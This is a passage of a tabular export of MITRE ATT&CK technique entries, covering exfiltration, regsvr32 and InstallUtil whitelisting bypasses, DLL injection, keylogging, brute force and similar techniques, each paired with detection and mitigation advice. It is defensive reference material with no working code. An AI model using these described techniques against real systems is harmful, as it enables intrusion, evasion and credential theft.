logged in, similar to ""net session"".']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],Technique/T1049,['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
1528,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring', 'Process use of network', 'Packet capture', 'Netflow/Enclave netflow', 'Network protocol analysis']","['Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.']",[],[],[],"['Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. For example, if services like FTP are not required for sending information outside of a network, then block FTP-related ports at the network perimeter. Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.[[CiteRef::TechNet Firewall Design]] These actions will help reduce command and control and exfiltration path opportunities.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],Technique/T1048,['Exfiltration Over Alternative Protocol'],https://attack.mitre.org/wiki/Technique/T1048
1529,"[""Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.""]",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [[Technique/T1036|Masquerading]] to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.'],[],[],[],"['Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],Technique/T1023,['Shortcut Modification'],https://attack.mitre.org/wiki/Technique/T1023
1530,"['Determining the original entry point for a binary is difficult, but checksum and signature verification is very possible. Modifying the LC_MAIN entry point or adding in an additional LC_MAIN entry point invalidates the signature for the file and can be detected. Collect running process information and compare against known applications to look for suspicious behavior.']","['Application whitelisting', 'Process whitelisting', 'Whitelisting by file name or path']",[],[],"['Binary file metadata', 'Malware reverse engineering', 'Process Monitoring']","[u'As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary\u2019s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD [[CiteRef::Prolific OSX Malware History]]. The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn\u2019t know anything was different [[CiteRef::Methods of Mac Malware Persistence]]. By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.']",[],[],[],['Enforce valid digital signatures for signed code on all applications and only trust applications with signatures from trusted parties.'],"['MacOS', 'OS X']","['User', 'Administrator']",[],[],['Defense Evasion'],Technique/T1149,['LC_MAIN Hijacking'],https://attack.mitre.org/wiki/Technique/T1149
1531,"['Access to the clipboard is a legitimate function of many applications on a Windows system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.']",[],[],[],['API monitoring'],"['Adversaries may collect data stored in the Windows clipboard from users copying information within or between applications. \n\n===Windows===\n\nApplications can access clipboard data by using the Windows API.[[CiteRef::MSDN Clipboard]] \n\n===Mac===\n\nOSX provides a native command, <code>pbpaste</code>, to grab clipboard contents [[CiteRef::Operating with EmPyre]].']",[],[],[],"['Instead of blocking software based on clipboard capture behavior, identify potentially malicious software that may contain this functionality, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],Technique/T1115,['Clipboard Data'],https://attack.mitre.org/wiki/Technique/T1115
1532,"['There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for [[Exfiltration]], unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Authentication logs', 'File monitoring', 'Process monitoring', 'Process use of network']","[""Adversaries may target user email to collect sensitive information from a target.\n\nFiles containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.\n\nAdversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.\n\nSome adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.""]",[],[],[],"['Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.\n\nUse of two-factor authentication for public-facing webmail servers is also a recommended best practice to minimize the usefulness of user names and passwords to adversaries.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to collect email data files or access the corporate email server, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Collection'],Technique/T1114,['Email Collection'],https://attack.mitre.org/wiki/Technique/T1114
1533,['Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.'],"['Process whitelisting', 'Anti-virus']",[],['Casey Smith'],"['Loaded DLLs', 'Process monitoring', 'Process command-line parameters', 'Windows Registry']","['Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries.[[CiteRef::Microsoft Regsvr32]]\n\nAdversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.\n\nRegsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.[[CiteRef::SubTee Regsvr32 Whitelisting Bypass]] This variation of the technique has been used in campaigns targeting governments.[[CiteRef::FireEye Regsvr32 Targeting Mongolian Gov]]']",[],[],[],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Execution']",Technique/T1117,['Regsvr32'],https://attack.mitre.org/wiki/Technique/T1117
1534,['Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.'],['Windows User Account Control'],[],[],['Binary file metadata'],"['Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.[[CiteRef::Wikipedia Code Signing]] However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries[[CiteRef::Janicab]]. The certificates used during an operation may be created, forged, or stolen by the adversary.[[CiteRef::Securelist Digital Certificates]][[CiteRef::Symantec Digital Certificates]]\n\nCode signing to verify software on first run can be used on modern Windows and MacOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.[[CiteRef::Wikipedia Code Signing]]\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.']",[],[],[],['Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system.[[CiteRef::NSA MS AppLocker]][[CiteRef::TechNet Trusted Publishers]][[CiteRef::Securelist Digital Certificates]]'],"['MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",[],[],[],['Defense Evasion'],Technique/T1116,['Code Signing'],https://attack.mitre.org/wiki/Technique/T1116
1535,['Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.'],[],[],"['John Lambert, Microsoft Threat Intelligence Center']",[],"['Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.\n\nIf a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.[[CiteRef::Mandiant M Trends 2011]]\n\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors.[[CiteRef::Operation Emmental]]\n\nOther hardware tokens, such as RSA SecurID, require the adversary to have access to the physical device or the seed and algorithm in addition to the corresponding credentials.']",[],[],[],"['Remove smart cards when not in use. Protect devices and services used to transmit and receive out-of-band codes.\n\nIdentify and block potentially malicious software that may be used to intercept 2FA credentials on a system by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']","['Smart card Proxy: Use of smart cards for single or multifactor authentication to access to network resources. Attached smart card reader with card inserted.\n\nOut-of-band one-time code: Access to the device, service, or communications to intercept the one-time code.\n\nHardware token: Access to the seed and algorithm of generating one-time codes.']",[],['Credential Access'],Technique/T1111,['Two-Factor Authentication Interception'],https://attack.mitre.org/wiki/Technique/T1111
1536,"['It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. \n\nMonitor authentication logs for system and application login failures of [[Technique/T1078|Valid Accounts]]. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.\n\nAlso monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.']",[],[],['John Strand'],['Authentication logs'],"[""Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.\n\n[[Technique/T1003|Credential Dumping]] to obtain password hashes may only get an adversary so far when [[Technique/T1075|Pass the Hash]] is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table. Cracking hashes is usually done on adversary-controlled systems outside of the target network.[[CiteRef::Wikipedia Password cracking]]\n\nAdversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.[[CiteRef::Cylance Cleaver]]\n\nA related technique called password spraying uses one password, or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.[[CiteRef::BlackHillsInfosec Password Spraying]]""]",[],[],[],['Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Use multifactor authentication. Follow best practices for mitigating access to [[Technique/T1078|Valid Accounts]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Credential Access'],Technique/T1110,['Brute Force'],https://attack.mitre.org/wiki/Technique/T1110
1537,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']","['Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.\n\n===Mac===\n\nOn OSX, the native command <code>screencapture</code> is used to capture screenshots.\n\n===Linux===\n\nOn Linux, there is the native command <code>xwd</code>.[[CiteRef::Antiquated Mac Malware]]']",[],[],[],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],Technique/T1113,['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
1538,"['Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], which may require additional logging features to be configured in the operating system to collect necessary information for analysis.']",['Host forensic analysis'],[],['Bartosz Jerzman'],"['Windows Registry', 'File monitoring', 'Process monitoring', 'Process command-line parameters']","[""Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in [[Persistence]] and [[Execution]].\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [[Software/S0075|Reg]] may be used for local or remote Registry modification.[[CiteRef::Microsoft Reg]] Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).\n\nThe Registry of a remote system may be modified to aid in execution of files as part of [[Lateral Movement]]. It requires the remote Registry service to be running on the target system.[[CiteRef::Microsoft Remote]] Often [[Technique/T1078|Valid Accounts]] are required, along with access to the remote system's [[Technique/T1077|Windows Admin Shares]] for RPC communication.""]",[],[],[],['Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Defense Evasion'],Technique/T1112,['Modify Registry'],https://attack.mitre.org/wiki/Technique/T1112
1539,['Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.'],[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['Data exfiltration may be performed only at certain times of day or at certain intervals.  This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],Technique/T1029,['Scheduled Transfer'],https://attack.mitre.org/wiki/Technique/T1029
1540,"['Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [[Technique/T1074|Data Staged]]. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Data loss prevention']","['Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [[Technique/T1064|Scripting]] to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [[Technique/T1083|File and Directory Discovery]] and [[Technique/T1105|Remote File Copy]] to identify and move files.']",[],[],[],"['Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. A keylogger installed on a system may be able to intercept passwords through [[Technique/T1056|Input Capture]] and be used to decrypt protected documents that an adversary may have collected. Strong passwords should be used to prevent offline cracking of encrypted documents through [[Technique/T1110|Brute Force]] techniques.\n\nIdentify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to collect files and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],['Permissions to access directories and files that store information of interest.'],[],['Collection'],Technique/T1119,['Automated Collection'],https://attack.mitre.org/wiki/Technique/T1119
1541,['Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.'],['Process whitelisting'],[],['Casey Smith'],"['Process monitoring', 'Process command-line parameters']",['InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.[[CiteRef::MSDN InstallUtil]] InstallUtil is located in the .NET directory on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code>.InstallUtil.exe is digitally signed by Microsoft.\n\nAdversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>.[[CiteRef::SubTee GitHub All The Things Application Whitelisting Bypass]]'],[],[],[],['InstallUtil may not be necessary within a given environment. Use application whitelisting configured to block execution of InstallUtil.exe if it is not required for a given system or network to prevent potential misuse by adversaries.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],"['Defense Evasion', 'Execution']",Technique/T1118,['InstallUtil'],https://attack.mitre.org/wiki/Technique/T1118
1542,"[""Plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.""]",[],[],[],['File monitoring'],"[""The configurations for how applications run on macOS and OS X are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window [[CiteRef::Antiquated Mac Malware]].""]",[],[],[],['Whitelist programs that are allowed to have this plist tag. All other programs should be considered suspicious.'],"['MacOS', 'OS X']",['User'],[],[],['Defense Evasion'],Technique/T1143,['Hidden Window'],https://attack.mitre.org/wiki/Technique/T1143
1543,"['Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked.']","['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",['571'],[],"['Sensor health and status', 'Process command-line parameters', 'Process monitoring']","['An adversary may attempt to block indicators or events from leaving the host machine. In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process or creating a host-based firewall rule to block traffic to a specific server.']",[],[],[],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],Technique/T1054,['Indicator Blocking'],https://attack.mitre.org/wiki/Technique/T1054
1544,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']","[""DLL injection is used to run code in the context of another process by causing the other process to load and execute code. Running code in the context of another process provides adversaries many benefits, such as access to the process's memory and permissions. It also allows adversaries to mask their actions under a legitimate process. A more sophisticated kind of DLL injection, reflective DLL injection, loads code without calling the normal Windows API calls, potentially bypassing DLL load monitoring. Numerous methods of DLL injection exist on Windows, including modifying the Registry, creating remote threads, Windows hooking APIs, and DLL pre-loading.[[CiteRef::CodeProject Inject Code]][[CiteRef::Wikipedia DLL Injection]]""]",[],[],[],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],"['Defense Evasion', 'Privilege Escalation']",Technique/T1055,['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
1545,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']","['Adversaries can use methods of capturing user input for obtaining credentials for [[Technique/T1078|Valid Accounts]] and information [[Collection]] that include keylogging and user input field interception.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes,[[CiteRef::Adventures of a Keystroke]] but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider.[[CiteRef::Wrightson 2012]]\n\nKeylogging is likely to be used to acquire credentials for new access opportunities when [[Technique/T1003|Credential Dumping]] efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.\n\nAdversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [[Technique/T1133|External Remote Services]] and [[Technique/T1078|Valid Accounts]] or as part of the initial compromise by exploitation of the externally facing web service.[[CiteRef::Volexity Virtual Private Keylogging]]']",[],[],[],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 